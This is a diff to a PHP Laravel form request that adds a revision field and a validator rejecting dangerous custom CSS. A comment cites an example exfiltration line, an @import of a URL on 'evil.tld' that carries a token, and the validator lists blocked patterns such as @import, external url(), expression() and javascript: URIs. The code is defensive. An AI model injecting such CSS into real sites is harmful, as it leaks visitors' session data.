@@ -25,6 +25,11 @@ class SaveThemeRequest extends FormRequest
         $hex = ['nullable', 'string', 'regex:/^#([0-9a-fA-F]{3}|[0-9a-fA-F]{6}|[0-9a-fA-F]{8})$/'];
 
         return [
+            // Optimistic-lock companion field. Studio sends the revision it
+            // last fetched via /state; controller compares against the
+            // current `theme_revision` setting to detect concurrent writes.
+            'expected_revision' => ['nullable', 'integer', 'min:0'],
+
             'theme_preset' => ['nullable', 'string', 'max:32'],
             'theme_mode' => ['nullable', 'in:dark,light,auto'],
             'theme_primary' => $hex,
@@ -50,7 +55,7 @@ class SaveThemeRequest extends FormRequest
             'theme_font' => ['nullable', 'string', 'max:64'],
             'theme_shadow_intensity' => ['nullable', 'integer', 'min:0', 'max:100'],
             'theme_density' => ['nullable', 'in:compact,comfortable,spacious'],
-            'theme_custom_css' => ['nullable', 'string', 'max:20000'],
+            'theme_custom_css' => ['nullable', 'string', 'max:20000', $this->customCssRule()],
 
             // Layout (Vague 3 démarrage). Defaults reproduce the prior
             // hardcoded AppLayout. Persisted as plain strings in the
@@ -112,5 +117,37 @@ class SaveThemeRequest extends FormRequest
             'sidebar_config.entries.*.route_suffix' => ['nullable', 'string', 'max:64'],
             'sidebar_config.entries.*.order' => ['nullable', 'integer'],
         ];
+    }
+
+    /**
+     * Reject custom CSS that could exfiltrate data, leak cookies through a
+     * referer, or attempt legacy script execution. The textarea is admin-only
+     * but a compromised admin or a misuse of the settings API could otherwise
+     * inject `@import url("https://evil.tld/x.css?token=...")` and ride on the
+     * authenticated session of every panel visitor. We block patterns at save
+     * time so the malicious blob never lands in the DB.
+     */
+    private function customCssRule(): \Closure
+    {
+        return function (string $attribute, $value, \Closure $fail): void {
+            if (! is_string($value) || $value === '') {
+                return;
+            }
+            $patterns = [
+                '/@import\b/i'                       => '@import declarations',
+                '/url\s*\(\s*["\']?\s*https?:/i'     => 'external URLs in url()',
+                '/url\s*\(\s*["\']?\s*\/\//i'        => 'protocol-relative URLs in url()',
+                '/expression\s*\(/i'                 => 'expression()',
+                '/behavior\s*:/i'                    => 'behavior: declarations',
+                '/javascript\s*:/i'                  => 'javascript: URIs',
+                '/<\s*script\b/i'                    => '<script tags',
+            ];
+            foreach ($patterns as $regex => $label) {
+                if (preg_match($regex, $value)) {
+                    $fail("Custom CSS cannot contain {$label}.");
+                    return;
+                }
+            }
+        };
     }
 }
